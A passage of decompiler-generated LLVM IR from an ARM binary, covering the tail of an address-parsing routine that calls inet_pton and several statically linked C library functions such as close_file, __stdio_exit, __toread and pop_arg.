  %v9_13ea0 = urem i32 %v8_13ea0, 2
  store i32 %v9_13ea0, i32* @r3, align 4
  %phitmp = icmp eq i32 %v9_13ea0, 0
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread10, label %dec_label_pc_13f70

.thread10:                                        ; preds = %bb67, %.thread54
  %v2_13ea8 = add i32 %v1_13ea8, 1
  store i32 %v2_13ea8, i32* @r6, align 4
  br label %dec_label_pc_13ed0thread-pre-split

dec_label_pc_13eb8:                               ; preds = %dec_label_pc_13e88
  %v1_13eb8 = add i32 %v0_13e64, 1
  %v2_13ebc = add i32 %v1_13e64, %v1_13eb8
  store i32 %v2_13ebc, i32* @r5, align 4
  %v0_13dc4.pre.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_13ec0

dec_label_pc_13ec0:                               ; preds = %dec_label_pc_13e0c, %dec_label_pc_13eb8
  %v0_13dc4.pre = phi i32 [ %v0_13e04, %dec_label_pc_13e0c ], [ %v0_13dc4.pre.pre, %dec_label_pc_13eb8 ]
  %v0_13ec0 = phi i32 [ %v0_13e04, %dec_label_pc_13e0c ], [ %v1_13ea8, %dec_label_pc_13eb8 ]
  %v0_13dc020 = phi i32 [ %v1_13df8, %dec_label_pc_13e0c ], [ %v2_13ebc, %dec_label_pc_13eb8 ]
  %v1_13ec0 = add i32 %v0_13ec0, 1
  store i32 %v1_13ec0, i32* @r6, align 4
  br label %dec_label_pc_13dc0

dec_label_pc_13ec8:                               ; preds = %dec_label_pc_13de4
  store i32 %v4_13df8, i32* @r7, align 4
  %v0_13ecc = load i32, i32* @r6, align 4
  br label %dec_label_pc_13ed0

dec_label_pc_13ed0thread-pre-split:               ; preds = %bb66, %bb65, %.thread10
  %storemerge = phi i32 [ 1, %.thread10 ], [ %v6_13e64, %bb65 ], [ %v6_13e64, %bb66 ]
  %v0_13edc33 = phi i32 [ %v2_13ea8, %.thread10 ], [ %v0_13e70, %bb65 ], [ 7, %bb66 ]
  store i32 %storemerge, i32* @r7, align 4
  %v0_13ed0.pr = load i32, i32* @ip, align 4
  br label %dec_label_pc_13ed0

dec_label_pc_13ed0:                               ; preds = %dec_label_pc_13ed0thread-pre-split, %dec_label_pc_13ec8
  %v1_13ef0 = phi i32 [ %v0_13edc33, %dec_label_pc_13ed0thread-pre-split ], [ %v0_13ecc, %dec_label_pc_13ec8 ]
  %v0_13ee0 = phi i32 [ %v0_13ed0.pr, %dec_label_pc_13ed0thread-pre-split ], [ %v0_13ecc, %dec_label_pc_13ec8 ]
  %v1_13ed0 = icmp slt i32 %v0_13ee0, 0
  %v2_13ed0 = icmp eq i32 %v0_13ee0, 0
  store i1 %v2_13ed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_13ed0, label %dec_label_pc_13f1c, label %dec_label_pc_13ed8

dec_label_pc_13ed8:                               ; preds = %dec_label_pc_13ed0
  %v0_13ed8 = load i32, i32* @sp, align 4
  %v3_13ed8 = mul i32 %v0_13ee0, 2
  %v4_13ed8 = add i32 %v0_13ed8, %v3_13ed8
  store i32 %v4_13ed8, i32* @r4, align 4
  %v1_13edc = add i32 %v1_13ef0, 1
  %v2_13ee0 = sub i32 %v1_13edc, %v0_13ee0
  %v2_13ee8 = mul i32 %v2_13ee0, 2
  store i32 %v2_13ee8, i32* @r2, align 4
  store i32 %v4_13ed8, i32* %r1.global-to-local, align 4
  %tmp94 = mul i32 %v1_13ef0, -2
  %v1_13ee4 = add i32 %tmp94, 14
  %v4_13ef0 = add i32 %v1_13ee4, %v4_13ed8
  store i32 %v4_13ef0, i32* %r0.global-to-local, align 4
  %v2_13ef4 = inttoptr i32 %v4_13ef0 to i8*
  %v3_13ef4 = call i32 @memmove(i8* %v2_13ef4, i32 %v4_13ed8)
  store i32 %v3_13ef4, i32* %r0.global-to-local, align 4
  %v0_13ef8 = load i32, i32* @r6, align 4
  %v1_13ef8 = sub i32 7, %v0_13ef8
  store i32 %v1_13ef8, i32* %r2.global-to-local, align 4
  %v0_13f1078 = load i32, i32* @r4, align 4
  %v1_13f1079 = add i32 %v0_13f1078, 2
  store i32 %v1_13f1079, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v5_13f1880 = icmp sgt i32 %v1_13ef8, 0
  br i1 %v5_13f1880, label %dec_label_pc_13f04, label %dec_label_pc_13f1c.loopexit

dec_label_pc_13f04:                               ; preds = %dec_label_pc_13ed8, %dec_label_pc_13f04
  %v0_13f1081 = phi i32 [ %v0_13f10, %dec_label_pc_13f04 ], [ %v0_13f1078, %dec_label_pc_13ed8 ]
  %v4_13f08 = inttoptr i32 %v0_13f1081 to i16*
  store i16 0, i16* %v4_13f08, align 2
  %v0_13f0c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13f0c.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_13f10 = load i32, i32* @r4, align 4
  %v1_13f10 = add i32 %v0_13f10, 2
  store i32 %v1_13f10, i32* @r4, align 4
  %v1_13f14 = add i32 %v0_13f0c.pre, 1
  store i32 %v1_13f14, i32* %r1.global-to-local, align 4
  %v5_13f18 = icmp slt i32 %v0_13f0c.pre, %v1_13f0c.pre
  br i1 %v5_13f18, label %dec_label_pc_13f04, label %dec_label_pc_13f0c.dec_label_pc_13f1c.loopexit_crit_edge

dec_label_pc_13f0c.dec_label_pc_13f1c.loopexit_crit_edge: ; preds = %dec_label_pc_13f04
  br label %dec_label_pc_13f1c.loopexit

dec_label_pc_13f1c.loopexit:                      ; preds = %dec_label_pc_13f0c.dec_label_pc_13f1c.loopexit_crit_edge, %dec_label_pc_13ed8
  %v1_13f0c.lcssa = phi i32 [ %v1_13f0c.pre, %dec_label_pc_13f0c.dec_label_pc_13f1c.loopexit_crit_edge ], [ %v1_13ef8, %dec_label_pc_13ed8 ]
  %v0_13f0c.lcssa = phi i32 [ %v0_13f0c.pre, %dec_label_pc_13f0c.dec_label_pc_13f1c.loopexit_crit_edge ], [ 0, %dec_label_pc_13ed8 ]
  %v9_13f0c = icmp eq i32 %v0_13f0c.lcssa, %v1_13f0c.lcssa
  store i1 %v9_13f0c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13f1c

dec_label_pc_13f1c:                               ; preds = %dec_label_pc_13f1c.loopexit, %dec_label_pc_13ed0
  %v0_13f1c = load i32, i32* @r8, align 4
  store i32 %v0_13f1c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_13cf8, i32* @ip, align 4
  br label %dec_label_pc_13f28

dec_label_pc_13f28:                               ; preds = %dec_label_pc_13f28.dec_label_pc_13f28_crit_edge, %dec_label_pc_13f1c
  %v3_13f30 = phi i32 [ %v3_13f30.pre, %dec_label_pc_13f28.dec_label_pc_13f28_crit_edge ], [ %v0_13f1c, %dec_label_pc_13f1c ]
  %v1_13f28 = phi i32 [ %v1_13f28.pre, %dec_label_pc_13f28.dec_label_pc_13f28_crit_edge ], [ %v2_13cf8, %dec_label_pc_13f1c ]
  %v2_13f30 = phi i32 [ %v0_13f28.pre, %dec_label_pc_13f28.dec_label_pc_13f28_crit_edge ], [ 0, %dec_label_pc_13f1c ]
  %v2_13f28 = add i32 %v2_13f30, %v1_13f28
  %v3_13f28 = inttoptr i32 %v2_13f28 to i16*
  %v4_13f28 = load i16, i16* %v3_13f28, align 2
  %v6_13f28 = zext i16 %v4_13f28 to i32
  store i32 %v6_13f28, i32* %r2.global-to-local, align 4
  %div = udiv i16 %v4_13f28, 256
  %v3_13f2c = zext i16 %div to i32
  store i32 %v3_13f2c, i32* @r3, align 4
  %v1_13f30 = trunc i16 %div to i8
  %v4_13f30 = add i32 %v2_13f30, %v3_13f30
  %v5_13f30 = inttoptr i32 %v4_13f30 to i8*
  store i8 %v1_13f30, i8* %v5_13f30, align 1
  %v0_13f34 = load i32, i32* %r0.global-to-local, align 4
  %v1_13f34 = add i32 %v0_13f34, 2
  store i32 %v1_13f34, i32* %r0.global-to-local, align 4
  %v7_13f38 = icmp eq i32 %v1_13f34, 16
  store i1 %v7_13f38, i1* %cpsr_z.global-to-local, align 1
  %v0_13f3c = load i32, i32* %r2.global-to-local, align 4
  %v1_13f3c = trunc i32 %v0_13f3c to i8
  %v2_13f3c = load i32, i32* %r1.global-to-local, align 4
  %v3_13f3c = add i32 %v2_13f3c, 1
  %v4_13f3c = inttoptr i32 %v3_13f3c to i8*
  store i8 %v1_13f3c, i8* %v4_13f3c, align 1
  %v0_13f40 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f40 = add i32 %v0_13f40, 2
  store i32 %v1_13f40, i32* %r1.global-to-local, align 4
  %v0_13f44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13f44, label %dec_label_pc_13f48, label %dec_label_pc_13f28.dec_label_pc_13f28_crit_edge

dec_label_pc_13f28.dec_label_pc_13f28_crit_edge:  ; preds = %dec_label_pc_13f28
  %v0_13f28.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_13f28.pre = load i32, i32* @ip, align 4
  %v3_13f30.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_13f28

dec_label_pc_13f48:                               ; preds = %dec_label_pc_13f28
  %v0_13f48 = load i32, i32* @r7, align 4
  %v2_13f48 = icmp eq i32 %v0_13f48, 0
  store i1 %v2_13f48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f48, label %dec_label_pc_13f78, label %dec_label_pc_13f50

dec_label_pc_13f50:                               ; preds = %dec_label_pc_13f48
  %v0_13f50 = load i32, i32* @r8, align 4
  %v1_13f50 = add i32 %v0_13f50, 12
  store i32 %v1_13f50, i32* %r2.global-to-local, align 4
  %v0_13f54 = load i32, i32* @r5, align 4
  store i32 %v0_13f54, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v5_13f5c = call i32 @inet_pton(i16 2, i32 %v0_13f54, i32 %v1_13f50)
  store i32 %v5_13f5c, i32* %r0.global-to-local, align 4
  %v2_13f60 = icmp eq i32 %v5_13f5c, 0
  store i1 %v2_13f60, i1* %cpsr_z.global-to-local, align 1
  %tmp68 = icmp slt i32 %v5_13f5c, 1
  br i1 %tmp68, label %.thread55, label %bb69

.thread55:                                        ; preds = %dec_label_pc_13f50
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f98

bb69:                                             ; preds = %dec_label_pc_13f50
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f98

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13e80, %dec_label_pc_13e4c, %dec_label_pc_13e04, %dec_label_pc_13d64, %dec_label_pc_13d6c, %dec_label_pc_13d48, %dec_label_pc_13d3c, %dec_label_pc_13d2c, %bb67, %dec_label_pc_13e90, %dec_label_pc_13dac
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f98

dec_label_pc_13f78:                               ; preds = %bb, %dec_label_pc_13f48
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f98

dec_label_pc_13f80:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13f8c

dec_label_pc_13f8c:                               ; preds = %dec_label_pc_13d78, %dec_label_pc_13f80
  %v2_13d50 = phi i32 [ %v1_13d6c, %dec_label_pc_13d78 ], [ 0, %dec_label_pc_13f80 ]
  %v0_13d3c = phi i32 [ %v2_13d7c, %dec_label_pc_13d78 ], [ %arg2, %dec_label_pc_13f80 ]
  %v0_13f8c = phi i32 [ %v0_13f8c.pre, %dec_label_pc_13d78 ], [ 0, %dec_label_pc_13f80 ]
  store i32 %v0_13f8c, i32* %r2.global-to-local, align 4
  store i32 %v0_13f8c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13d1c

dec_label_pc_13f98:                               ; preds = %.thread55, %bb69, %dec_label_pc_13f78, %dec_label_pc_13f70, %dec_label_pc_13d8c
  %v0_13f98 = phi i32 [ 0, %.thread55 ], [ 1, %bb69 ], [ 1, %dec_label_pc_13f78 ], [ 0, %dec_label_pc_13f70 ], [ %v0_13f98.pre, %dec_label_pc_13d8c ]
  store i32 %v0_13f98, i32* %r0.global-to-local, align 4
  %v2_13fa0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13fa0, i32* @r4, align 4
  store i32 %v6_13cf0, i32* @r5, align 4
  store i32 %v9_13cf0, i32* @r6, align 4
  store i32 %v12_13cf0, i32* @r7, align 4
  store i32 %v15_13cf0, i32* @r8, align 4
  store i32 %v18_13cf0, i32* @lr, align 4
  ret i32 %v0_13f98

; uselistorder directives
  uselistorder i32 %v0_13f98, { 1, 0 }
  uselistorder i32 %v0_13f8c, { 3, 2, 0, 1 }
  uselistorder i32 %v0_13f10, { 1, 0 }
  uselistorder i32 %v0_13f0c.pre, { 0, 2, 1 }
  uselistorder i32 %v1_13ef8, { 1, 0, 2 }
  uselistorder i32 %v4_13ef0, { 1, 0 }
  uselistorder i32 %v4_13ed8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_13ecc, { 1, 0 }
  uselistorder i32 %v1_13ec0, { 1, 0 }
  uselistorder i32 %v9_13ea0, { 1, 0 }
  uselistorder i1 %v7_13e90, { 1, 0 }
  uselistorder i1 %v7_13e88, { 1, 0 }
  uselistorder i32 %v1_13ea8, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_13e74, { 1, 0 }
  uselistorder i32 %v0_13e70, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 %v1_13e64, { 1, 0 }
  uselistorder i32 %v0_13e64, { 1, 0 }
  uselistorder i32 %v1_13e44, { 1, 0 }
  uselistorder i32 %v1_13e2c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13e04, { 1, 0, 2, 3 }
  uselistorder i1 %v2_13dd4, { 1, 0 }
  uselistorder i1 %v7_13dc8, { 1, 0 }
  uselistorder i1 %v7_13d64, { 1, 0 }
  uselistorder i32 %v1_13d54, { 1, 0 }
  uselistorder i32 %v0_13d54, { 1, 0 }
  uselistorder i32 %v0_13d50, { 0, 2, 1 }
  uselistorder i32 %v1_13d20, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13d34, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_13d14, { 1, 0, 2 }
  uselistorder i32 %v19_13cf0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 10, 9, 1, 11, 12, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 6, 12, 7, 8, 9, 10, 11, 15, 13, 17, 14, 18, 16, 3, 4, 5, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 11, 12, 13, 14, 0, 15, 16, 38, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 37, 32, 33, 34, 35, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 36 }
  uselistorder i16 2, { 1, 0, 3, 2 }
  uselistorder i32* @sp, { 3, 1, 2, 0 }
  uselistorder i16 0, { 2, 3, 1, 4, 5, 0 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_13f98, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_13f8c, { 1, 0 }
  uselistorder label %dec_label_pc_13f78, { 1, 0 }
  uselistorder label %dec_label_pc_13f70, { 8, 9, 0, 1, 2, 10, 4, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_13f04, { 1, 0 }
  uselistorder label %dec_label_pc_13ed0thread-pre-split, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ec0, { 1, 0 }
  uselistorder label %dec_label_pc_13e80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13e24, { 1, 0 }
  uselistorder label %.thread5.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_13d64, { 1, 0 }
  uselistorder label %dec_label_pc_13d3c, { 1, 0 }
  uselistorder label %dec_label_pc_13d1c, { 1, 0 }
}

define i32 @execve() local_unnamed_addr {
entry:
  %v0_13fb4 = call i32 @__syscall_ret()
  ret i32 %v0_13fb4
}

define i32 @close_file(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_13fc4 = icmp eq i32 %arg1, 0
  store i1 %v2_13fc4, i1* @cpsr_z, align 1
  br i1 %v2_13fc4, label %dec_label_pc_14030, label %dec_label_pc_13fd0

dec_label_pc_13fd0:                               ; preds = %entry
  %v1_13fd0 = add i32 %arg1, 76
  %v2_13fd0 = inttoptr i32 %v1_13fd0 to i32*
  %v3_13fd0 = load i32, i32* %v2_13fd0, align 4
  %v3_13fd8 = icmp sgt i32 %v3_13fd0, -1
  call void @__pseudo_cond_branch(i1 %v3_13fd8, i32 ptrtoint (i32* @global_var_12e08.555 to i32))
  %v0_13fdc = load i32, i32* %r4.global-to-local, align 4
  %v1_13fdc = add i32 %v0_13fdc, 20
  %v2_13fdc = inttoptr i32 %v1_13fdc to i32*
  %v3_13fdc = load i32, i32* %v2_13fdc, align 4
  %v1_13fe0 = add i32 %v0_13fdc, 28
  %v2_13fe0 = inttoptr i32 %v1_13fe0 to i32*
  %v3_13fe0 = load i32, i32* %v2_13fe0, align 4
  %tmp = icmp ugt i32 %v3_13fdc, %v3_13fe0
  br i1 %tmp, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_13fd0
  store i32 %v0_13fdc, i32* %r0.global-to-local, align 4
  %v5_13ff4 = add i32 %v0_13fdc, 36
  %v6_13ff4 = inttoptr i32 %v5_13ff4 to i32*
  %v7_13ff4 = load i32, i32* %v6_13ff4, align 4
  store i32 %v7_13ff4, i32* @ip, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13fd0, %bb
  %.04 = phi i32 [ %v7_13ff4, %bb ], [ undef, %dec_label_pc_13fd0 ]
  call void @__pseudo_cond_branch(i1 %tmp, i32 %.04)
  %v0_14000 = load i32, i32* %r4.global-to-local, align 4
  %v1_14000 = add i32 %v0_14000, 4
  %v2_14000 = inttoptr i32 %v1_14000 to i32*
  %v3_14000 = load i32, i32* %v2_14000, align 4
  %v1_14004 = add i32 %v0_14000, 8
  %v2_14004 = inttoptr i32 %v1_14004 to i32*
  %v3_14004 = load i32, i32* %v2_14004, align 4
  store i32 %v3_14004, i32* @r2, align 4
  %v3_14008 = icmp ult i32 %v3_14000, %v3_14004
  %v9_14008 = icmp eq i32 %v3_14000, %v3_14004
  store i1 %v9_14008, i1* @cpsr_z, align 1
  br i1 %v3_14008, label %dec_label_pc_14010, label %dec_label_pc_14030

dec_label_pc_14010:                               ; preds = %.thread6
  %v2_14008 = sub i32 %v3_14000, %v3_14004
  store i32 %v2_14008, i32* @r2, align 4
  store i32 %v0_14000, i32* %r0.global-to-local, align 4
  %v1_14024 = add i32 %v0_14000, 40
  %v2_14024 = inttoptr i32 %v1_14024 to i32*
  %v3_14024 = load i32, i32* %v2_14024, align 4
  store i32 %v3_14024, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_14024)
  br label %dec_label_pc_14030

dec_label_pc_14030:                               ; preds = %.thread6, %entry, %dec_label_pc_14010
  %v1_14038 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14038

; uselistorder directives
  uselistorder i1 %tmp, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 undef, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_14030, { 2, 0, 1 }
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @__stdio_exit() local_unnamed_addr {
entry:
  %v0_14040 = call i32 @__ofl_lock()
  %storemerge.in2 = inttoptr i32 %v0_14040 to i32*
  %storemerge3 = load i32, i32* %storemerge.in2, align 4
  store i32 %storemerge3, i32* @r4, align 4
  %v2_140545 = icmp eq i32 %storemerge3, 0
  br i1 %v2_140545, label %dec_label_pc_1405c, label %dec_label_pc_1404c

dec_label_pc_1404c:                               ; preds = %entry, %dec_label_pc_1404c
  %storemerge6 = phi i32 [ %storemerge, %dec_label_pc_1404c ], [ %storemerge3, %entry ]
  %v1_1404c = call i32 @close_file(i32 %storemerge6)
  %v0_14050 = load i32, i32* @r4, align 4
  %v1_14050 = add i32 %v0_14050, 56
  %storemerge.in = inttoptr i32 %v1_14050 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_14054 = icmp eq i32 %storemerge, 0
  br i1 %v2_14054, label %dec_label_pc_1405c, label %dec_label_pc_1404c

dec_label_pc_1405c:                               ; preds = %dec_label_pc_1404c, %entry
  %v2_14060 = load i32, i32* @global_var_23e58.678, align 4
  %v1_14064 = call i32 @close_file(i32 %v2_14060)
  %v2_1406c = load i32, i32* @global_var_23d1c.557, align 4
  %v1_14074 = call i32 @close_file(i32 %v2_1406c)
  %v0_14078 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14078, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1405c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1405c, %bb
  ret i32 %v1_14074

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @close_file, { 2, 1, 0 }
  uselistorder i32 ()* @__ofl_lock, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1404c, { 1, 0 }
}

define i32 @__toread() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14080 = load i32, i32* @r4, align 4
  store i32 %v3_14080, i32* %stack_var_-8, align 4
  %v0_14084 = load i32, i32* @r0, align 4
  %v1_14084 = add i32 %v0_14084, 74
  %v2_14084 = inttoptr i32 %v1_14084 to i8*
  %v3_14084 = load i8, i8* %v2_14084, align 1
  %v4_14084 = zext i8 %v3_14084 to i32
  store i32 %v4_14084, i32* @ip, align 4
  %v1_14088 = add i32 %v0_14084, 20
  %v2_14088 = inttoptr i32 %v1_14088 to i32*
  %v3_14088 = load i32, i32* %v2_14088, align 4
  %v1_1408c = add i32 %v0_14084, 44
  %v2_1408c = inttoptr i32 %v1_1408c to i32*
  %v3_1408c = load i32, i32* %v2_1408c, align 4
  %v1_14090 = add nsw i32 %v4_14084, -1
  %v2_14094 = or i32 %v1_14090, %v4_14084
  store i32 %v2_14094, i32* %r3.global-to-local, align 4
  %v3_14098 = icmp uge i32 %v3_14088, %v3_1408c
  store i1 %v3_14098, i1* %cpsr_c.global-to-local, align 1
  %v9_14098 = icmp eq i32 %v3_14088, %v3_1408c
  store i1 %v9_14098, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14084, i32* %r4.global-to-local, align 4
  %v1_140a0 = trunc i32 %v2_14094 to i8
  store i8 %v1_140a0, i8* %v2_14084, align 1
  %v0_140a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_140a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_140a4 = xor i1 %v1_140a4, true
  %v3_140a4 = and i1 %v0_140a4, %v2_140a4
  br i1 %v3_140a4, label %bb, label %entry..thread8_crit_edge

entry..thread8_crit_edge:                         ; preds = %entry
  %v0_140b4.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb:                                               ; preds = %entry
  %v4_140ac = load i32, i32* @r0, align 4
  %v5_140ac = add i32 %v4_140ac, 36
  %v6_140ac = inttoptr i32 %v5_140ac to i32*
  %v7_140ac = load i32, i32* %v6_140ac, align 4
  store i32 %v7_140ac, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %entry..thread8_crit_edge, %bb
  %v0_140b4 = phi i32 [ %v0_140b4.pre, %entry..thread8_crit_edge ], [ %v7_140ac, %bb ]
  call void @__pseudo_cond_branch(i1 %v3_140a4, i32 %v0_140b4)
  %v0_140b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_140b8 = inttoptr i32 %v0_140b8 to i32*
  %v2_140b8 = load i32, i32* %v1_140b8, align 4
  store i32 %v2_140b8, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_140c0 = and i32 %v2_140b8, 4
  %v2_140c0 = icmp eq i32 %v1_140c0, 0
  store i1 %v2_140c0, i1* %cpsr_z.global-to-local, align 1
  %v2_140c4 = add i32 %v0_140b8, 20
  %v3_140c4 = inttoptr i32 %v2_140c4 to i32*
  store i32 0, i32* %v3_140c4, align 4
  %v0_140c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_140c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_140c8 = add i32 %v1_140c8, 16
  %v3_140c8 = inttoptr i32 %v2_140c8 to i32*
  store i32 %v0_140c8, i32* %v3_140c8, align 4
  %v0_140cc = load i32, i32* %r3.global-to-local, align 4
  %v1_140cc = load i32, i32* %r4.global-to-local, align 4
  %v2_140cc = add i32 %v1_140cc, 28
  %v3_140cc = inttoptr i32 %v2_140cc to i32*
  store i32 %v0_140cc, i32* %v3_140cc, align 4
  br i1 %v2_140c0, label %dec_label_pc_140e0, label %.thread1

.thread1:                                         ; preds = %.thread8
  %v1_140d0 = load i32, i32* @r2, align 4
  %v2_140d0 = or i32 %v1_140d0, 32
  store i32 %v2_140d0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_140d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_140d8 = inttoptr i32 %v2_140d8 to i32*
  store i32 %v2_140d0, i32* %v3_140d8, align 4
  br label %bb12

dec_label_pc_140e0:                               ; preds = %.thread8
  %v0_140e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_140e0 = add i32 %v0_140e0, 44
  %v1_140e4 = inttoptr i32 %v1_140e0 to i32*
  %v2_140e4 = load i32, i32* %v1_140e4, align 4
  %v3_140e4 = add i32 %v0_140e0, 48
  %v4_140e4 = inttoptr i32 %v3_140e4 to i32*
  %v5_140e4 = load i32, i32* %v4_140e4, align 4
  %v2_140e8 = add i32 %v5_140e4, %v2_140e4
  store i32 %v2_140e8, i32* %r3.global-to-local, align 4
  %v0_140ec = load i32, i32* @r2, align 4
  %v1_140ec = and i32 %v0_140ec, 16
  store i32 %v1_140ec, i32* %r0.global-to-local, align 4
  %v2_140ec = icmp eq i32 %v1_140ec, 0
  store i1 %v2_140ec, i1* %cpsr_z.global-to-local, align 1
  %v2_140f0 = add i32 %v0_140e0, 4
  %v3_140f0 = inttoptr i32 %v2_140f0 to i32*
  store i32 %v2_140e8, i32* %v3_140f0, align 4
  %v0_140f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_140f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_140f4 = add i32 %v1_140f4, 8
  %v3_140f4 = inttoptr i32 %v2_140f4 to i32*
  store i32 %v0_140f4, i32* %v3_140f4, align 4
  br i1 %v2_140ec, label %bb12, label %bb11

bb11:                                             ; preds = %dec_label_pc_140e0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %bb12

bb12:                                             ; preds = %.thread1, %dec_label_pc_140e0, %bb11
  %v2_140fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_140fc, i32* @r4, align 4
  %v1_14100 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14100

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %bb12, { 2, 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @__toread_needs_stdio_exit() local_unnamed_addr {
entry:
  %v0_1410c = call i32 @__stdio_exit()
  ret i32 %v0_1410c

; uselistorder directives
  uselistorder i32 ()* @__stdio_exit, { 1, 0, 2 }
}

define i32 @pop_arg(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_1411c = load i32, i32* @r1, align 4
  %v0_14120 = load i32, i32* @r4, align 4
  store i32 %v0_14120, i32* %stack_var_-4, align 4
  %tmp = icmp ugt i32 %v0_1411c, 20
  br i1 %tmp, label %dec_label_pc_1421c, label %dec_label_pc_1412c

dec_label_pc_1412c:                               ; preds = %entry
  %v1_1412c = add i32 %v0_1411c, -9
  %tmp3 = icmp ult i32 %v1_1412c, 10
  br i1 %tmp3, label %bb, label %dec_label_pc_1421c

bb:                                               ; preds = %dec_label_pc_1412c
  %v7_14134 = mul i32 %v1_1412c, 4
  %v8_14134 = add i32 %v7_14134, ptrtoint (i32* @global_var_1413c.680 to i32)
  %v9_14134 = inttoptr i32 %v8_14134 to i32*
  %v10_14134 = load i32, i32* %v9_14134, align 4
  call void @__pseudo_branch(i32 %v10_14134)
  %v2_1421c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1421c

dec_label_pc_1421c:                               ; preds = %bb, %dec_label_pc_1412c, %entry
  %v2_1421c = phi i32 [ %v2_1421c.pre, %bb ], [ %v0_14120, %dec_label_pc_1412c ], [ %v0_14120, %entry ]
  store i32 %v2_1421c, i32* @r4, align 4
  ret i32 %arg1

; uselistorder directives
